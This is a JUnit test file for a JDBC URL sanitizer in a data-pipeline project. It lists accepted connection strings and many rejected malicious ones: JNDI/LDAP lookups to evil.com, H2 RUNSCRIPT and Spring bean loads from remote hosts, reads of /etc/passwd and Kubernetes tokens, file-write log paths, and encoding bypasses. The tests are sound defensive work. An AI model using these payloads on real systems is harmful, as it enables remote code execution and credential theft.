/*
 * Copyright © 2026 Cask Data, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

package io.cdap.cdap.etl.common.jdbc;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import org.junit.Assert;
import org.junit.Test;

/**
 * Unit tests for {@link JdbcUrlSanitizer}.
 */
public class JdbcUrlSanitizerTest {

  @Test
  public void testValidJdbcUrlsAndPropertiesPass() {
    List<String> validUrls = Arrays.asList(
      "jdbc:mysql://localhost:3306/mydb?useSSL=true&requireSSL=true&connectTimeout=20000&serverTimezone=UTC",
      "jdbc:mysql://10.0.0.1:3306/mydb?rewriteBatchedStatements=true&tinyInt1isBit=false&useCursorFetch=true",
      "jdbc:mysql:///mydb?cloudSqlInstance=proj:us-central1:inst"
        + "&socketFactory=com.google.cloud.sql.mysql.SocketFactory",
      "jdbc:postgresql://localhost:5432/mydb?ssl=true&sslmode=verify-full& currentSchema=public",
      "jdbc:postgresql:///mydb?cloudSqlInstance=proj:us-central1:inst"
        + "&socketFactory=com.google.cloud.sql.postgres.SocketFactory",
      "jdbc:sqlserver://localhost:1433;databaseName=mydb;encrypt=true;trustServerCertificate=false;loginTimeout=30;",
      "jdbc:oracle:thin:@//localhost:1521/ORCLPDB1",
      "jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS=(PROTOCOL=tcps)(HOST=myhost)(PORT=2484))"
        + "(CONNECT_DATA=(SERVICE_NAME=mydb)))",
      "jdbc:db2://localhost:50000/MYDB:currentSchema=MYSCHEMA;loginTimeout=30;",
      "jdbc:mariadb://localhost:3306/mydb?useCompression=true&autoReconnect=true",
      "jdbc:teradata://localhost/DATABASE=mydb,TMODE=ANSI,CHARSET=UTF8,LOGMECH=LDAP",
      "jdbc:databricks://dbc-xxx.cloud.databricks.com:443/default;transportMode=http;ssl=1;AuthMech=3;"
        + "httpPath=/sql/1.0/warehouses/abc;ConnCatalog=main;",
      "jdbc:redshift://localhost:5439/dev?ssl=true",
      "jdbc:netezza://localhost:5480/system",
      "jdbc:sap://localhost:30015/?encrypt=true",
      "jdbc:hsqldb:hsql://localhost/testdb",
      "jdbc:hsqldb:mem:testdb",
      "jdbc:noop://"
    );

    for (String url : validUrls) {
      Assert.assertEquals(url, JdbcUrlSanitizer.sanitizeUrl(url));
    }

    Properties validProps = new Properties();
    validProps.setProperty("user", "dbuser");
    validProps.setProperty("password", "p@ss%word!100%");
    validProps.setProperty("connectTimeout", "30000");
    validProps.setProperty("socketTimeout", "30000");
    validProps.setProperty("useSSL", "true");
    validProps.setProperty("characterEncoding", "UTF-8");
    JdbcUrlSanitizer.validateProperties(validProps);
    JdbcUrlSanitizer.validateJdbcConnection("jdbc:postgresql://localhost:5432/mydb", validProps);
  }

  @Test
  public void testBlockedSubprotocolsAndSchemesRejected() {
    List<String> blockedUrls = Arrays.asList(
      "",
      "   ",
      "http://localhost:3306/mydb",
      "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/init.sql'",
      "jdbc:h2:tcp://localhost/~/test",
      "jdbc:sqlite:/var/run/secrets/kubernetes.io/serviceaccount/token",
      "jdbc:sqlite::memory:",
      "jdbc:derby:memory:myDB;create=true",
      "jdbc:derby:rmi://localhost:1527/mydb",
      "jdbc:modeshape:jcr:http://localhost:8080/modeshape",
      "jdbc:jndi:ldap://evil.com:1389/Exploit",
      "jdbc:ldap://evil.com:389/dc=example,dc=com",
      "jdbc:ldaps://evil.com:636/dc=example,dc=com",
      "jdbc:rmi://evil.com:1099/db",
      "jdbc:rowset:jndi:rmi://evil.com/rowset",
      "jdbc:hsqldb:file:/etc/passwd",
      "jdbc:hsqldb:res:/org/evil/db",
      "jdbc:tc:postgresql:13:///databasename",
      "jdbc:oracle:oci:@localhost:1521:orcl",
      "jdbc:mysql://localhost:3306/db?jndi:ldap://evil.com/x=1"
    );

    for (String url : blockedUrls) {
      assertUrlRejected(url);
    }
  }

  @Test
  public void testDangerousDriverUrlParametersRejected() {
    List<String> dangerousUrls = Arrays.asList(
      "jdbc:mysql://localhost:3306/db?allowLoadLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?allowUrlInLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?allowLoadLocalInfileInPath=/etc",
      "jdbc:mysql://localhost:3306/db?autoDeserialize=true",
      "jdbc:mysql://localhost:3306/db?queryInterceptors=com.evil.Interceptor",
      "jdbc:mysql://localhost:3306/db?statementInterceptors=com.evil.Interceptor",
      "jdbc:mysql://localhost:3306/db?connectionLifecycleInterceptors=com.evil.Interceptor",
      "jdbc:mysql://localhost:3306/db?exceptionInterceptors=com.evil.Interceptor",
      "jdbc:mysql://localhost:3306/db?authenticationPlugins=com.evil.Plugin",
      "jdbc:mysql://localhost:3306/db?clientInfoProvider=com.evil.Provider",
      "jdbc:mysql://localhost:3306/db?propertiesTransform=com.evil.Transform",
      "jdbc:mysql://localhost:3306/db?loadBalanceStrategy=com.evil.Strategy",
      "jdbc:mysql://(host=127.0.0.1,port=3306,allowLoadLocalInfile=true)/db",
      "jdbc:mysql:replication://(host=127.0.0.1,port=3306,autoDeserialize=true)/db",
      "jdbc:mysql://address=(protocol=tcp)(host=127.0.0.1)(allowLoadLocalInfile=true)/db",
      "jdbc:mysql://(host=127.0.0.1,(allowLoadLocalInfile=true))/db",
      "jdbc:postgresql://localhost:5432/db?socketFactory="
        + "org.springframework.context.support.FileSystemXmlApplicationContext"
        + "&socketFactoryArg=http://evil/bean.xml",
      "jdbc:postgresql://localhost:5432/db?socketFactory=com.google.cloud.sql.postgres.SocketFactory"
        + "&socketFactory=org.evil.Factory",
      "jdbc:postgresql://localhost:5432/db?socketFactory=com.google.cloud.sql.postgres.SocketFactory"
        + "&socketFactoryArg=evil",
      "jdbc:postgresql://localhost:5432/db?sslfactory=org.postgresql.ssl.SingleCertValidatingFactory"
        + "&sslfactoryarg=file:///etc/passwd",
      "jdbc:postgresql://localhost:5432/db?sslpasswordcallback=com.evil.Callback",
      "jdbc:postgresql://localhost:5432/db?sslhostnameverifier=com.evil.Verifier",
      "jdbc:postgresql://localhost:5432/db?authenticationPluginClassName=com.evil.AuthPlugin",
      "jdbc:postgresql://localhost:5432/db?loggerLevel=TRACE&loggerFile=/tmp/pwn.jsp",
      "jdbc:postgresql://localhost:5432/db?service=/var/run/secrets/kubernetes.io/serviceaccount/token",
      "jdbc:db2://localhost:50000/MYDB:clientRerouteServerListJNDIName=ldap://evil.com:1389/Exploit;",
      "jdbc:db2://localhost:50000/MYDB:traceFile=/tmp/db2trace.log;",
      "jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=localhost)(PORT=1521))"
        + "(CONNECT_DATA=(javax.naming.provider.url=ldap://evil.com:389/o=JNDITutorial)))",
      "jdbc:sqlserver://localhost:1433;databaseName=mydb;socketFactoryClass=com.evil.Factory;"
        + "socketFactoryConstructorArg=arg;",
      "jdbc:teradata://localhost/DATABASE=mydb,RUNSCRIPT=true",
      "jdbc:databricks://localhost:443/default;httpPath=/sql/1.0/warehouses/abc;"
        + "krbJAASFile=/var/run/secrets/kubernetes.io/serviceaccount/token;"
    );

    for (String url : dangerousUrls) {
      assertUrlRejected(url);
    }
  }

  @Test
  public void testEncodingCommentAndObfuscationBypassesRejected() {
    List<String> bypassUrls = Arrays.asList(
      "jdbc:mysql://localhost:3306/db?%61llowLoadLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?%2561llowLoadLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?%252561llowLoadLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?%252525252561llowLoadLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?%ZZallowLoadLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?allow/*comment*/LoadLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?allow/*outer/*inner*/outer*/LoadLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?allow/*unclosedLoadLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?allowLoadLocalInfile=true\0",
      "jdbc:mysql://localhost:3306/db?allowLoad\nLocalInfile=true",
      "jdbc:mysql://localhost:3306/db?allowLoad+LocalInfile=true",
      "jdbc:sqlserver://localhost:1433;trustStore={/var/run/secrets/kubernetes.io/serviceaccount/token};",
      "jdbc:postgresql://localhost:5432/db?sslrootcert=/var/run/secrets/kubernetes.io/serviceaccount/token#fragment"
    );

    for (String url : bypassUrls) {
      assertUrlRejected(url);
    }
  }

  @Test
  public void testPropertiesAndBackingDefaultsValidation() {
    Properties props = new Properties();
    props.setProperty("ALLOWLOADLOCALINFILE", "true");
    assertIllegalArgument(() -> JdbcUrlSanitizer.validateProperties(props));

    Properties socketFactoryProps = new Properties();
    socketFactoryProps.setProperty("socketFactory", "com.google.cloud.sql.mysql.SocketFactory");
    assertIllegalArgument(() -> JdbcUrlSanitizer.validateProperties(socketFactoryProps));

    Properties socketFactoryArgProps = new Properties();
    socketFactoryArgProps.setProperty("socketFactoryArg", "my-arg");
    assertIllegalArgument(
      () -> JdbcUrlSanitizer.validateJdbcConnection(
        "jdbc:mysql:///mydb?cloudSqlInstance=p:r:i&socketFactory=com.google.cloud.sql.mysql.SocketFactory",
        socketFactoryArgProps));

    Properties defaults = new Properties();
    defaults.setProperty("autoDeserialize", "true");
    Properties wrapper = new Properties(defaults);
    wrapper.setProperty("user", "alice");
    assertIllegalArgument(() -> JdbcUrlSanitizer.validateProperties(wrapper));

    Map<String, String> sensitiveMap = new HashMap<>();
    sensitiveMap.put("trustCertificateKeyStoreUrl", "file:/var/run/secrets/kubernetes.io/serviceaccount/token");
    assertIllegalArgument(() -> JdbcUrlSanitizer.validateConnectionArgumentsMap(sensitiveMap));
  }

  private static void assertUrlRejected(String url) {
    assertIllegalArgument(() -> JdbcUrlSanitizer.sanitizeUrl(url));
  }

  private static void assertIllegalArgument(Runnable action) {
    try {
      action.run();
      Assert.fail("Expected IllegalArgumentException to be thrown");
    } catch (IllegalArgumentException expected) {
      // expected
    }
  }
}
